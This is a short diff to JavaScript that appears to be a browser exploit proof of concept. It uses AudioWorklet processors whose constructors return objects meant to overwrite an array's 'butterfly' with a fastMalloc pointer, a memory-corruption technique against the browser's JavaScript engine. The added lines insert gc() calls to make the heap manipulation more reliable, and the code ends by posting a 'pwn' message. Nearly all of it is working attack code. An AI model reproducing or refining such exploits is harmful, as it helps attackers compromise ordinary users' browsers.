@@ -25,17 +25,21 @@
               eval('1 + 0x1336');
 
               // overwrite a1's butterfly with a fastMalloc pointer
+              gc()
               return {fill: 1, a: a0};
             }
           });
           registerProcessor("b", class {
             constructor() {
               // overwrite b1's butterfly with a fastMalloc pointer
+              gc();
               return {fill: 1, b: b0};
             }
+            
           });`], {type: "text/javascript"}))).then(async () => {
           var wa = new AudioWorkletNode(context, "a");
           var wb = new AudioWorkletNode(context, "b");
+          gc();
           wa.port.onmessage = (e) => { log(e.data); console.log(e.data) }
           await (new Promise((res) => setTimeout(res, 100)));
           wa.port.postMessage("pwn");
